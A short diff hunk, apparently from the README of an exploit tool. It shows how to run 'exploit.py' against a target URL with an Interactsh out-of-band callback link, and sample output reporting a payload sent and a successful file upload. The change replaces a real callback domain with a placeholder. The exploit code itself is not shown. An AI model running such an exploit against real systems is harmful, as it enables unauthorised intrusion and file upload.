@@ -27,8 +27,7 @@ Generate [Interactsh link](https://app.interactsh.com/#/)
 python3 exploit.py -u https://target-IP/?p=7
 ```
 ```
-Input interactsh link: ckr8x142vtc0000kbk9ggjhrqowyyyyyb.oast.fun
-  [+] Vulnerable version found: 1.24.6
+Input interactsh link: [Input here interactsh link]
   [+] Sending payload to target
   [+] Successful file upload!
 
